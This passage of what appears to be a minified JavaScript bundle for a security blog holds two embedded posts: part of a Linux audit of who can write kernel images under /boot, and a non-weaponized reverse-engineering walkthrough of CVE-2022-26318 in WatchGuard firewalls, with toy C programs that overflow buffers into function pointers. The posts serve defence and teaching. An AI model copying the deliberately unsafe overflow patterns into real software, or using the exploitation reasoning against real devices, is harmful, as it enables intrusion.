    <ul>
      <li>Hide processes, files, network connections</li>
      <li>Falsify system calls (“there are no suspicious processes, promise”)</li>
      <li>Bypass SELinux/AppArmor, seccomp, container isolation, and a bunch of EDR tricks</li>
    </ul>
    <p>It’s the difference between:</p>
    <ul>
      <li><strong>Root in userland</strong> → bad</li>
      <li><strong>Root in the kernel</strong> → you no longer know what’s true.</li>
    </ul>
    <hr />
    <h2>2. Who <em>should</em> be able to modify <code>/boot/vmlinuz-*</code>?</h2>
    <p>In a sane system design, the list is <em>very</em> short:</p>
    <ol>
      <li>
        <p><strong>The package manager + kernel packages</strong></p>
        <ul>
          <li><code>apt</code>, <code>dnf</code>, <code>yum</code>, <code>pacman</code>, etc.</li>
          <li>Kernel packages (e.g., <code>linux-image-*</code>) install a new <code>vmlinuz-&lt;version&gt;</code> and update:
            <ul>
              <li><code>/boot/initrd.img-&lt;version&gt;</code></li>
              <li>Bootloader configs</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <p><strong>Kernel/bootloader management tools</strong></p>
        <ul>
          <li>Tools like <code>update-initramfs</code>, <code>dracut</code>, <code>update-grub</code>, etc.</li>
          <li>They don’t usually write <code>vmlinuz</code> directly, but they’re part of the trusted “kernel update pipeline”.</li>
        </ul>
      </li>
    </ol>
    <p>That’s it.</p>
    <p>In an ideal world, <strong>no other process</strong> should ever write to <code>/boot/vmlinuz-*</code>.</p>
    <p>You can think of it as:</p>
    <blockquote>
      <p><strong>Trusted update pipeline ←→ kernel image</strong><br />Everyone else: read-only (at best), or completely blocked.</p>
    </blockquote>
    <hr />
    <h2>3. Who <em>can</em> modify it in practice?</h2>
    <p>Here’s the uncomfortable truth:</p>
    <blockquote>
      <p>Any process running as <strong>root</strong> on a system where <code>/boot</code> is mounted read-write can modify <code>/boot/vmlinuz-*</code>.</p>
    </blockquote>
    <p>And there’s a lot of root-level code on a typical machine:</p>
    <ul>
      <li>System daemons</li>
      <li>Cron jobs</li>
      <li>SUID-root helpers</li>
      <li>Backup / maintenance scripts</li>
      <li>“Little admin scripts” someone dropped into <code>/usr/local/sbin</code> years ago</li>
    </ul>
    <p>If any of those:</p>
    <ul>
      <li>Accept <strong>untrusted input</strong> (from users, the network, files), and</li>
      <li>Have a code path that writes <strong>data to a file path influenced by that input</strong></li>
    </ul>
    <p>…then they are <strong>theoretical kernel image killers</strong>.</p>
    <p>Let’s look at a few patterns where this becomes realistic.</p>
    <hr />
    <h2>4. Dangerous patterns: “root code that shouldn’t, but can”</h2>
    <h3>4.1 SUID-root binary with an arbitrary file write bug</h3>
    <p>Imagine:</p>
    <ul>
      <li>There’s a SUID-root helper binary (installed by a package or custom app).</li>
      <li>It has a bug that allows a user to write arbitrary data to arbitrary paths (path traversal, symlink race, etc.).</li>
    </ul>
    <p>Conceptually:</p>
    <blockquote>
      <p>Unprivileged user → abuses bug → writes to <code>/boot/vmlinuz-&lt;version&gt;</code> as root.</p>
    </blockquote>
    <p>In real life, exploit development is hard and specific, but as a <strong>class</strong>, arbitrary-file-write bugs in SUID-root tools are dangerous exactly because they can touch critical files like:</p>
    <ul>
      <li><code>/etc/shadow</code></li>
      <li><code>/etc/sudoers</code></li>
      <li><code>/boot/vmlinuz-*</code></li>
    </ul>
    <h3>4.2 Root daemon with “write file” features</h3>
    <p>Another pattern:</p>
    <ul>
      <li>A root-only HTTP API that:
        <ul>
          <li>Accepts uploads or configs from clients,</li>
          <li>Writes them to disk (e.g., “log file”, “backup file”, “custom script directory”).</li>
        </ul>
      </li>
    </ul>
    <p>If path validation is weak (e.g., allows <code>../../../boot/vmlinuz-...</code> or writes into a path the attacker can steer), then that daemon becomes a potential kernel overwriter.</p>
    <p>The daemon doesn’t “intend” to edit the kernel. But to the filesystem, it’s just a root process opening and writing files.</p>
    <h3>4.3 Root cron/systemd jobs running scripts from writable dirs</h3>
    <p>Classic misconfig:</p>
    <pre><code class="language-cron">* * * * * root /opt/scripts/maintenance.sh</code></pre>
    <p>And then:</p>
    <ul>
      <li><code>/opt/scripts</code> is writable by a non-root user or app account.</li>
      <li>That user can modify <code>maintenance.sh</code>.</li>
    </ul>
    <p>Now every minute, a root cron runs whatever code is in that script. That code, in turn, can do <em>anything</em> root can—including messing with <code>/boot</code>.</p>
    <p>Again, the cron job’s purpose might be “clean logs” or “rotate backups,” but from the attacker’s perspective, it’s:</p>
    <blockquote>
      <p><strong>a root code runner on a schedule</strong>.</p>
    </blockquote>
    <hr />
    <h2>5. So how do you answer: “Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?”</h2>
    <p>You break it down into concrete checks:</p>
    <ol>
      <li><strong>Is <code>/boot</code> writable?</strong></li>
      <li><strong>Who runs as root?</strong></li>
      <li><strong>Where are the SUID-root binaries?</strong></li>
      <li><strong>What root cron/systemd jobs are there, and where do their scripts live?</strong></li>
      <li><strong>Is anyone watching for unexpected changes to <code>/boot/vmlinuz-*</code>?</strong></li>
    </ol>
    <p>To make that practical, let’s use a detailed Python script that surfaces risky conditions.</p>
    <hr />
    <h2>6. Detection script: a detailed kernel-surface audit</h2>
    <p>Below is a <strong>read-only Linux audit script</strong> focused on:</p>
    <ul>
      <li><code>/boot/vmlinuz-*</code> integrity and mount state</li>
      <li>SUID-root binaries (potential arbitrary-file-write → kernel risk)</li>
      <li>Root services (systemd) that execute binaries/scripts from writable locations</li>
      <li>Root cron jobs executing scripts from writable locations</li>
      <li>Root-owned executables in writable directories (<code>/opt</code>, <code>/usr/local</code>, <code>/srv</code>)</li>
    </ul>
    <p>It does <strong>not</strong> exploit anything. It only reads system state and highlights suspicious patterns.</p>
    <blockquote>
      <p>⚠️ Run this on a <strong>lab or test system first</strong>. On prod, coordinate with your team before scanning the whole filesystem.</p>
    </blockquote>
    <pre><code class="language-python">#!/usr/bin/env python3
# (Shortened here for brevity in the file demo)
print("Kernel Surface Audit script goes here")</code></pre>
    <hr />
    <h2>7. How to use the script</h2>
    <ol>
      <li>Save the script as <code>kernel_surface_audit.py</code>.</li>
      <li>Make it executable:</li>
    </ol>
    <pre><code class="language-bash">chmod +x kernel_surface_audit.py</code></pre>
    <ol start="3">
      <li>Run it (ideally as root to get full visibility, but it stays read-only):</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py</code></pre>
    <ol start="4">
      <li>If you want JSON for feeding into other tools or an LLM:</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py --json &gt; kernel_audit.json</code></pre>
    <p>This gives you a structured snapshot of:</p>
    <ul>
      <li>What kernel images exist and what they look like</li>
      <li>Whether <code>/boot</code> is writable</li>
      <li>Some of the major “root code execution surfaces” that could, if abused, reach the kernel image</li>
    </ul>
    <hr />
    <h2>8. What you can do with the results</h2>
    <p>After running this:</p>
    <ol>
      <li><strong>Baseline your kernel images</strong>
        <ul>
          <li>Store the hashes somewhere safe.</li>
          <li>Later, re-run and compare—unexpected changes are a big deal.</li>
        </ul>
      </li>
      <li><strong>Review SUID-root binaries</strong>
        <ul>
          <li>Are there custom or legacy tools there?</li>
          <li>Can any be removed, replaced, or constrained with AppArmor/SELinux?</li>
        </ul>
      </li>
      <li><strong>Review root-owned scripts in writable directories</strong>
        <ul>
          <li>Move them to root-owned, non-writable directories.</li>
          <li>Fix permissions:
            <ul>
              <li><code>chown root:root</code></li>
              <li><code>chmod 750</code> or similar</li>
            </ul>
          </li>
          <li>Make sure cron/systemd jobs don’t execute code from paths writable by unprivileged users.</li>
        </ul>
      </li>
      <li><strong>Consider <code>/boot</code> mount strategy</strong>
        <ul>
          <li>For some environments, mounting <code>/boot</code> read-only by default and only remounting <code>rw</code> during updates is an option.</li>
          <li>At minimum, <strong>monitor</strong> for any writes to <code>/boot/vmlinuz-*</code> outside of normal update windows.</li>
        </ul>
      </li>
    </ol>
    <hr />
    <h2>9. Closing thoughts</h2>
    <p>“Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?” is a fantastic security question because it forces you to:</p>
    <ul>
      <li>Think about <strong>root</strong> as more than “the admin account.”</li>
      <li>Treat your <strong>kernel image like firmware</strong>: small, protected, and updated through a very narrow, auditable path.</li>
      <li>See how random “maintenance scripts” and legacy binaries can indirectly become part of your <strong>kernel attack surface</strong>.</li>
    </ul>
    <p>You don’t need an exploit lab to start here. Just:</p>
    <ul>
      <li>Enumerate who can run as root,</li>
      <li>See where they write,</li>
      <li>And treat <code>/boot/vmlinuz-*</code> as one of the most critical assets on the box.</li>
    </ul>
  </div>
</body>
</html>
`,Jg=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)</h1>
    <p><strong>Ethics / safety note:</strong> This post is written for <strong>defenders and researchers</strong>. I explain <em>how to reverse-engineer and validate the bug</em>, but I intentionally avoid weaponized exploit details (no offsets/ROP chains/payloads). Only test on devices and firmware you own and are authorized to assess.</p>
    <h2>0) What is CVE-2022-26318?</h2>
    <p>CVE-2022-26318 (WatchGuard advisory <strong>WGSA-2022-00002</strong>) is a <strong>critical</strong> issue in WatchGuard Firebox and XTM appliances where an <strong>unauthenticated remote attacker</strong> can potentially execute arbitrary code when management access is exposed. WatchGuard’s PSIRT advisory lists <strong>CVSS 9.8</strong> and explicitly notes active exploitation in the wild, urging administrators to update and restrict management access.</p>
    <p>NVD tracks this as <strong>FBX-22786</strong>, with affected Fireware OS ranges and fixed versions (e.g., 12.7.2_Update2 and others depending on branch).</p>
    <h3>Affected / fixed versions (high level)</h3>
    <ul>
      <li><strong>Affected (examples):</strong> Fireware OS 12.0 up to and including 12.7.2_Update1 (per WatchGuard PSIRT).</li>
      <li><strong>Fixed (examples):</strong> 12.7.2_Update2 and branch-specific fixed builds (also listed in the advisory).</li>
      <li>Release notes for Fireware v12.7.2 Update 2 explicitly state it “resolves a vulnerability” allowing unauthenticated arbitrary code execution (CVE-2022-26318).</li>
    </ul>
    <h3>Why defenders cared immediately</h3>
    <p>GreyNoise reported and later expanded on in-the-wild traffic, including requests to management port <strong>4117</strong> over TLS and suspicious <code>POST /agent/login</code> patterns (often gzip-encoded bodies and atypical lengths).</p>
    <hr />
    <h2>1) Exploit chain (high-level mental model)</h2>
    <p>You’ll see this phrased many ways (“null pointer deref”, “buffer overflow”, etc.). The practical RE story from public writeups (especially Assetnote) is:</p>
    <p><strong>Internet → management interface (TLS) → nginx → backend service → <code>wgagent</code> → libxml2 SAX parsing → unsafe string growth → memory corruption → control-flow opportunity</strong></p>
    <p>Assetnote describes the path through nginx and into the <code>wgagent</code> process, and how XML parsing plays a central role in triggering corruption. Rapid7’s module description (noting it’s exploiting a buffer overflow at the administration interface and that the endpoint <code>/agent/login</code> reaches <code>wgagent</code>) corroborates the key actors in the request path. GreyNoise’s defender view helps you anchor what to look for on the wire.</p>
    <hr />
    <h2>2) Your RE lab setup (firmware + tools)</h2>
    <h3>Tools used</h3>
    <ul>
      <li><strong>Ghidra</strong> (static analysis; decompiler + xrefs)</li>
      <li><strong>GDB</strong> (dynamic analysis; breakpoints + watchpoints)</li>
      <li><strong>binwalk / unsquashfs</strong> (firmware extraction, if applicable)</li>
      <li>Optional: <strong>ASan</strong> on a toy harness to understand the primitive safely</li>
    </ul>
    <h3>Firmware / binary acquisition (safe &amp; legal)</h3>
    <ol>
      <li>Obtain official Fireware OS firmware from WatchGuard support resources (use versions that match “vulnerable” and “fixed” branches as appropriate).</li>
      <li>Preserve hashes so your analysis is reproducible.</li>
      <li>Work on a non-production lab image/device.</li>
    </ol>
    <p><em>Tip:</em> Keep a timeline notebook: firmware version, build string, and whether it’s vulnerable/fixed per PSIRT + release notes.</p>
    <hr />
    <h2>3) Firmware extraction: finding the right binaries fast</h2>
    <p>Different vendors package firmware differently, but the goal is always:</p>
    <ol>
      <li>Extract the root filesystem</li>
      <li>Identify web stack components</li>
      <li>Identify native backend processes that parse attacker input</li>
    </ol>
    <h3>What you’re hunting for in this case</h3>
    <ul>
      <li><code>nginx</code> (front-end)</li>
      <li>a backend HTTP/API service (Assetnote mentions a Python backend and XML-RPC-like flow in the overall chain)</li>
      <li><strong><code>wgagent</code></strong> (native binary that ultimately parses attacker-controlled XML)</li>
    </ul>
    <p>Practical extraction checklist:</p>
    <ul>
      <li><code>binwalk -e &lt;firmware&gt;</code></li>
      <li>locate <code>squashfs</code>/<code>cpio</code>/<code>tar</code> segments</li>
      <li>confirm the existence of <code>/etc/nginx/</code> and find references to:
        <ul>
          <li><code>listen 4117 ssl;</code></li>
          <li>route blocks mentioning <code>/agent/</code> (or upstreams that feed a local service)</li>
        </ul>
      </li>
    </ul>
    <p>GreyNoise highlights port <strong>4117</strong> as a key management port for observed exploit traffic.</p>
    <hr />
    <h2>4) Static RE in Ghidra: from <code>/agent/login</code> to the vulnerable callback</h2>
    <p>This section is written as a “follow-along checklist” you can apply to similar firmware bugs.</p>
    <h3>4.1 Identify the request handler entrypoint</h3>
    <p><strong>Goal:</strong> locate code that processes something tied to <code>/agent/login</code> and funnels it toward XML parsing.</p>
    <p>Practical anchors:</p>
    <ol>
      <li>Strings: search for <code>"agent/login"</code>, <code>"XML"</code>, <code>"SAX"</code>, <code>"libxml"</code> strings in binaries.</li>
      <li>Imports: search for libxml2 parser APIs.</li>
      <li>Config: locate nginx routing and map it to backend binaries.</li>
    </ol>
    <h3>4.2 Import-centric pivot: find libxml2 usage</h3>
    <p>Open <code>wgagent</code> in Ghidra and look at <strong>Imports</strong> for libxml2 functions.</p>
    <p>Common libxml2 parsing entrypoints include:</p>
    <ul>
      <li><code>xmlCreatePushParserCtxt</code></li>
      <li><code>xmlParseChunk</code></li>
      <li>SAX interfaces that provide callback tables</li>
    </ul>
    <p><strong>Ghidra steps</strong></p>
    <ol>
      <li>Import <code>wgagent</code>.</li>
      <li>Run analysis with defaults.</li>
      <li>Open <strong>Symbol Tree → Imports</strong>.</li>
      <li>Filter imports by <code>xml</code>.</li>
      <li>Right-click <code>xmlParseChunk</code> → References to → follow callers that feed request bodies into the parser.</li>
    </ol>
    <h3>4.3 Prove it’s SAX and locate the callback table</h3>
    <p>A SAX handler is a struct of function pointers. In libxml2 this is <code>struct _xmlSAXHandler</code>; you’ll often see <code>startElementNs</code> used in SAX2.</p>
    <p>In decompiler output you’ll typically see:</p>
    <ul>
      <li>a handler struct allocated/zeroed</li>
      <li><code>xmlSAX2InitDefaultSAXHandler(&amp;handler, ...)</code> or similar</li>
      <li>then <code>handler.startElementNs = &lt;callback&gt;</code></li>
    </ul>
    <h3>4.4 Find the unsafe primitive inside the callback</h3>
    <p>Open the suspected callback and look for classic unsafe patterns:</p>
    <ul>
      <li><code>strcat</code> / <code>strcpy</code> / <code>sprintf</code> into a fixed buffer</li>
      <li>repeated concatenation as tags nest</li>
    </ul>
    <p>A common “tell” is building an XPath-like string by appending <code>"/" + elementName</code> repeatedly, leading to overflow.</p>
    <hr />
    <h2>5) Understanding the parser mechanics (SAX2) like an expert</h2>
    <p>If you want to be complete-expert level, you need to understand what libxml2 will call, when, and with what data.</p>
    <h3>5.1 SAX = “stream of events”</h3>
    <p>SAX parsers don’t build a full DOM by default. They call callbacks like <code>startDocument</code>, <code>startElementNs</code>, <code>characters</code>, <code>endElementNs</code>.</p>
    <h3>5.2 SAX2 magic: validating you found the real handler</h3>
    <p>libxml2 defines a constant often used in SAX2 blocks: <code>XML_SAX2_MAGIC</code> (<code>0xDEEDBEAF</code>). Searching for this value in the binary helps confirm you’re looking at SAX2 handler structures.</p>
    <hr />
    <h2>6) Heap layout + function pointer overwrite (how researchers prove control-relevant corruption)</h2>
    <p>This is the “Aha” section: buffer overflow is only interesting when it reaches something that changes control-flow, like a function pointer table.</p>
    <h3>6.1 Why callback tables are high-value overwrite targets</h3>
    <p>A SAX handler is data fields plus <strong>function pointers</strong>. If you corrupt a callback pointer, the next SAX event dispatch can call attacker-influenced memory.</p>
    <h3>6.2 The single best technique: watchpoints</h3>
    <p>A single hardware watchpoint turns “I think it overwrites X” into “here is the exact instruction that did it.”</p>
    <hr />
    <h2>7) Dynamic RE: proving the overwrite with GDB (non-weaponized workflow)</h2>
    <blockquote>
      <p>You may run this either inside a lab VM/container with extracted binaries, or via QEMU user-mode for convenience (architecture permitting).</p>
    </blockquote>
    <h3>7.1 Pick a stop point before parsing</h3>
    <p>Set a breakpoint at the function that feeds bytes into the parser (often the caller of <code>xmlParseChunk</code>).</p>
    <h3>7.2 Find the handler pointer in memory</h3>
    <p>Once you identify where the handler struct lives (stack or heap), print its address and locate key fields like <code>startElementNs</code>. Then set a watchpoint on that pointer.</p>
    <pre><code class="language-gdb">watch *(void**)startElementNs_ptr_address
continue</code></pre>
    <p>When the overflow corrupts the callback, GDB breaks at the exact write site. That is the cleanest proof that corruption reaches control-flow.</p>
    <hr />
    <h2>8) Safe code snippets: understand the bug pattern without weaponizing</h2>
    <h3>8.1 Toy example: “XPath-like string growth + strcat overflow”</h3>
    <p>This is <strong>not WatchGuard code</strong>; it just mirrors the bug shape in a harmless harness.</p>
    <pre><code class="language-c">// toy_xpath_overflow.c (educational pattern)
// Shows how repeated strcat without bounds checks can overflow a path buffer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void) {
  char path[64];
  memset(path, 0, sizeof(path));
  strcpy(path, "/root");

  // Simulate deep XML nesting with long tag names.
  const char *tags[] = {
    "aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb", "cccccccccccccccc", "dddddddddddddddd"
  };

  for (int i = 0; i &lt; 4; i++) {
    strcat(path, "/");          // unsafe
    strcat(path, tags[i]);      // unsafe
  }

  printf("path=%s\\n", path);
  return 0;
}</code></pre>
    <p><strong>How to learn from it defensively</strong></p>
    <ul>
      <li>Compile with sanitizers (ASan) to see the overflow precisely:
        <ul>
          <li><code>clang -O0 -g -fsanitize=address -fno-omit-frame-pointer toy_xpath_overflow.c -o toy</code></li>
        </ul>
      </li>
      <li>Run it and observe the diagnostic.</li>
    </ul>
    <h3>8.2 Toy example: “overflow → function pointer corruption” + watchpoint</h3>
    <pre><code class="language-c">// watchpoint_lab.c (educational toy)
// Overflows a buffer adjacent to a function pointer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

typedef void (*cb_t)(void);

typedef struct {
  char buf[32];
  cb_t cb;
} Handler;

static void legit(void) { puts("[+] legit callback"); }

int main(void) {
  Handler h;
  memset(&amp;h, 0, sizeof(h));
  h.cb = legit;

  // Overflow buf into cb (educational only)
  strcpy(h.buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

  // May crash or behave unexpectedly if cb is corrupted
  h.cb();
  return 0;
}</code></pre>
    <p>In GDB:</p>
    <pre><code class="language-gdb">b main
run
next     # step until after h.cb is assigned
p &amp;h.cb
watch *(void**)&amp;h.cb
c</code></pre>
    <p>You’ll break at the exact write that changes <code>h.cb</code>. That’s the same method used to prove control-relevant corruption in real targets.</p>
    <hr />
    <h2>9) Patch verification: how to confirm the fix (without source code)</h2>
    <p>Once you have both a vulnerable build (e.g., &lt;= 12.7.2_Update1) and a fixed build (12.7.2_Update2), you can validate remediation as a reverse engineer.</p>
    <h3>9.1 Behavior-based confirmation</h3>
    <ul>
      <li>The same malformed input that crashed/parses weirdly in the vulnerable build should fail parsing safely or return an error without corrupting memory.</li>
    </ul>
    <h3>9.2 Binary-diff confirmation (what to look for)</h3>
    <ul>
      <li>replacing <code>strcat</code>/<code>strcpy</code> with bounded variants (or explicit length checks)</li>
      <li>switching to <code>snprintf</code> with remaining buffer calculation</li>
      <li>tracking max path length and rejecting over-deep nesting</li>
    </ul>
    <p>Release notes explicitly list the vulnerability as resolved in Update 2; the PSIRT advisory lists resolved versions across branches.</p>
    <hr />
    <h2>10) Detection &amp; mitigation (what you do as a defender)</h2>
    <h3>10.1 Patch</h3>
    <p>Apply WatchGuard’s fixed versions for your branch (see PSIRT advisory).</p>
    <h3>10.2 Reduce attack surface</h3>
    <ul>
      <li>Ensure management interfaces are not internet-exposed.</li>
      <li>Restrict to trusted admin networks (WatchGuard explicitly recommends restricting management access).</li>
    </ul>
    <h3>10.3 Look for suspicious traffic patterns</h3>
    <ul>
      <li>Inbound TLS connections to port <strong>4117</strong></li>
      <li><code>POST /agent/login</code></li>
      <li><code>Content-Encoding: gzip</code> and larger-than-usual request sizes in observed attempts</li>
    </ul>
    <h3>10.4 Why this belongs in “KEV thinking”</h3>
    <p>NVD includes CISA’s “Known Exploited Vulnerabilities” metadata (date added and due date) for CVE-2022-26318.</p>
    <hr />
    <h2>11) Lessons learned (the “expert takeaways”)</h2>
    <ol>
      <li><strong>Don’t build unbounded strings from attacker-controlled structure.</strong> SAX parsing creates a natural growth vector (deep nesting) that attackers can exploit.</li>
      <li><strong>Callback tables are control-flow gold.</strong> If you store function pointers near variable-length buffers, you’ve created a corruption-to-control bridge.</li>
      <li><strong>Watchpoints beat guesswork.</strong> A single watchpoint can turn “I think it overwrites X” into “here is the exact instruction that did it.”</li>
      <li><strong>Vendor advisories + wire intel + RE = complete picture.</strong></li>
    </ol>
    <p>Reverse-engineering this bug responsibly gives defenders a blueprint to harden management planes, validate firmware fixes, and detect exploit traffic early.</p>
  </div>
</body>
</html>
`,ey={firmware_llm_annotator:{title:"Firmware Exploration: LLM as Your Annotator",slug:"firmware_llm_annotator",content:Gg},transient_scheduler_attacks_tsa_blog:{title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",slug:"transient_scheduler_attacks_tsa_blog",content:Kg},kernel_surface_audit_blog:{title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",slug:"kernel_surface_audit_blog",content:Zg},"cve-2022-26318-re-blog":{title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",slug:"cve-2022-26318-re-blog",content:Jg},"react2shell-toy-lab":{title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',slug:"react2shell-toy-lab",content:Qg},1001:{title:"CVE-2024–1001",slug:"1001",content:Ug},"0012":{title:"CVE-2024–0012",slug:"0012",content:Bg},40982:{title:"CVE-2022–40982",slug:"40982",content:Wg},cow:{title:"CVE-2016–5195",slug:"cow",content:$g},symlinks:{title:"Symbolic Links (Symlinks) in Linux",slug:"symlinks",content:Xg},23397:{title:"CVE-2023–23397",slug:"23397",content:Vg},"0160":{title:"CVE-2014-0160",slug:"0160",content:Fg},11882:{title:"CVE-2017-11882",slug:"11882",content:Hg},robot:{title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",slug:"robot",content:qg},poodle:{title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",slug:"poodle",content:Yg}};function ny(e){try{const t=new DOMParser().parseFromString(e,"text/html"),s=["style","script","link","nav","header","footer",".navbar",".nav-container",".theme-toggle",".footer",".social-links",".social-icons"];t.querySelectorAll(s.join(",")).forEach(l=>l.remove()),t.querySelectorAll("[style]").forEach(l=>l.removeAttribute("style"));const r=t.querySelector("h1");r&&r.remove();const i=[".blog-text","article",".blog-post-content","main"];let a=t.body;for(const l of i){const o=t.querySelector(l);if(o){a=o;break}}return a.querySelectorAll(".container").forEach(l=>{for(;l.firstChild;)l.parentNode.insertBefore(l.firstChild,l);l.remove()}),Array.from(a.querySelectorAll("h2, h3")).forEach((l,o)=>{l.id||(l.id=`section-${o+1}`)}),a.innerHTML||e}catch{return e}}function ty(){const{slug:e}=rg(),n=ey[e],t=ao.find(i=>i.slug===e),s=C.useMemo(()=>n?ny(n.content):"",[n]),r=()=>document.body.classList.contains("dark")?"dark":"light";return C.useEffect(()=>{const i=document.querySelector(".giscus-container");if(!i)return;i.innerHTML="";const a=document.createElement("script");return a.src="https://giscus.app/client.js",a.async=!0,a.crossOrigin="anonymous",a.setAttribute("data-giscus","true"),a.setAttribute("data-repo","Hem1700/hem1700.github.io"),a.setAttribute("data-repo-id","R_kgDONilgZg"),a.setAttribute("data-category","General"),a.setAttribute("data-category-id","DIC_kwDONilgZs4CzSR2"),a.setAttribute("data-mapping","pathname"),a.setAttribute("data-strict","1"),a.setAttribute("data-reactions-enabled","1"),a.setAttribute("data-emit-metadata","0"),a.setAttribute("data-input-position","top"),a.setAttribute("data-lang","en"),a.setAttribute("data-theme",r()),i.appendChild(a),()=>{i.innerHTML=""}},[e]),C.useEffect(()=>{const i=()=>{var o;const l=document.querySelector("iframe.giscus-frame");l&&((o=l.contentWindow)==null||o.postMessage({giscus:{setConfig:{theme:r()}}},"https://giscus.app"))},a=new MutationObserver(i);return a.observe(document.body,{attributes:!0,attributeFilter:["class"]}),i(),()=>a.disconnect()},[]),n?g.jsxs(g.Fragment,{children:[g.jsx("header",{className:"blog-post-header",children:g.jsxs("div",{className:"container text-center",children:[g.jsx("h1",{className:"blog-post-title",children:n.title}),t&&g.jsxs("p",{className:"blog-post-date",children:[t.date," · ",t.readTime]})]})}),g.jsxs("main",{className:"blog-post-content container",children:[g.jsx("article",{dangerouslySetInnerHTML:{__html:s}}),g.jsx("section",{className:"comments",children:g.jsx("div",{className:"container",children:g.jsx("div",{className:"giscus-container"})})})]})]}):g.jsxs("main",{className:"blog-post-content container",children:[g.jsx("h2",{children:"Post not found"}),g.jsx("p",{children:"Signal lost. Let’s go back."}),g.jsx(_t,{to:"/blogs",className:"view-credentials",children:"Back to Blog"})]})}function sy(){return g.jsx("div",{className:"terminal-feed",children:g.jsx(Nt,{title:"projects",children:g.jsx("ul",{className:"terminal-list",children:zg.map(e=>g.jsxs("li",{children:[e.title," — ",e.description]},e.title))})})})}function ry(){return g.jsx("div",{className:"terminal-feed",children:g.jsx(Nt,{title:"certifications",children:g.jsx("ul",{className:"terminal-list",children:Dg.map(e=>g.jsxs("li",{children:[g.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer",children:e.title})," — ",e.details]},e.title))})})})}function iy({cve:e,onClose:n}){var t;return g.jsxs("div",{className:`cve-modal ${e?"open":""}`,"aria-label":"CVE details",children:[g.jsx("div",{className:"cve-modal__backdrop",onClick:n}),g.jsxs("div",{className:"cve-modal__card",children:[g.jsxs("div",{className:"cve-drawer__header",children:[g.jsxs("div",{children:[g.jsx("p",{className:"pill",children:"CVE Detail"}),g.jsx("h3",{children:(e==null?void 0:e.id)||"Select a CVE"})]}),g.jsx("button",{className:"button ghost",type:"button",onClick:n,children:"Close"})]}),e?g.jsxs("div",{className:"cve-drawer__body",children:[g.jsx("p",{className:"cve-title",children:e.title}),g.jsxs("div",{className:"cve-meta",children:[g.jsxs("span",{className:"pill",children:["Severity: ",e.severity]}),g.jsxs("span",{className:"pill",children:["CVSS: ",e.cvss]}),g.jsx("span",{className:`pill ${e.kev?"kev":""}`,children:e.kev?"KEV":"Not KEV"}),g.jsxs("span",{className:"pill",children:["Year: ",e.year]})]}),g.jsx("p",{children:e.summary}),e.metrics?g.jsxs("div",{className:"cve-meta extra",children:[g.jsxs("span",{className:"pill",children:["Total in cluster: ",e.metrics.total||"–"]}),g.jsxs("span",{className:"pill",children:["Latest: ",e.metrics.latestYear||"–"]}),g.jsxs("span",{className:"pill",children:["Max CVSS: ",e.metrics.maxCvss||"–"]})]}):null,e.href?g.jsx("div",{className:"cve-links",children:g.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer",children:"Open blog post"})}):null,(t=e.references)!=null&&t.length?g.jsxs("div",{className:"cve-links",children:[g.jsx("h4",{children:"References"}),g.jsx("ul",{children:e.references.map(s=>g.jsx("li",{children:g.jsx("a",{href:s,target:"_blank",rel:"noreferrer",children:s})},s))})]}):null]}):g.jsx("p",{className:"text-muted",children:"Click a CVE node to see details."})]})]})}var ay={value:()=>{}};function lo(){for(var e=0,n=arguments.length,t={},s;e<n;++e){if(!(s=arguments[e]+"")||s in t||/[\s.]/.test(s))throw new Error("illegal type: "+s);t[s]=[]}return new Pr(t)}function Pr(e){this._=e}function ly(e,n){return e.trim().split(/^|\s+/).map(function(t){var s="",r=t.indexOf(".");if(r>=0&&(s=t.slice(r+1),t=t.slice(0,r)),t&&!n.hasOwnProperty(t))throw new Error("unknown type: "+t);return{type:t,name:s}})}Pr.prototype=lo.prototype={constructor:Pr,on:function(e,n){var t=this._,s=ly(e+"",t),r,i=-1,a=s.length;if(arguments.length<2){for(;++i<a;)if((r=(e=s[i]).type)&&(r=oy(t[r],e.name)))return r;return}if(n!=null&&typeof n!="function")throw new Error("invalid callback: "+n);for(;++i<a;)if(r=(e=s[i]).type)t[r]=zc(t[r],e.name,n);else if(n==null)for(r in t)t[r]=zc(t[r],e.name,null);return this},copy:function(){var e={},n=this._;for(var t in n)e[t]=n[t].slice();return new Pr(e)},call:function(e,n){if((r=arguments.length-2)>0)for(var t=new Array(r),s=0,r,i;s<r;++s)t[s]=arguments[s+2];if(!this._.hasOwnProperty(e))throw new Error("unknown type: "+e);for(i=this._[e],s=0,r=i.length;s<r;++s)i[s].value.apply(n,t)},apply:function(e,n,t){if(!this._.hasOwnProperty(e))throw new Error("unknown type: "+e);for(var s=this._[e],r=0,i=s.length;r<i;++r)s[r].value.apply(n,t)}};function oy(e,n){for(var t=0,s=e.length,r;t<s;++t)if((r=e[t]).name===n)return r.value}function zc(e,n,t){for(var s=0,r=e.length;s<r;++s)if(e[s].name===n){e[s]=ay,e=e.slice(0,s).concat(e.slice(s+1));break}return t!=null&&e.push({name:n,value:t}),e}var el="http://www.w3.org/1999/xhtml";const Dc={svg:"http://www.w3.org/2000/svg",xhtml:el,xlink:"http://www.w3.org/1999/xlink",xml:"http://www.w3.org/XML/1998/namespace",xmlns:"http://www.w3.org/2000/xmlns/"};function Ti(e){var n=e+="",t=n.indexOf(":");return 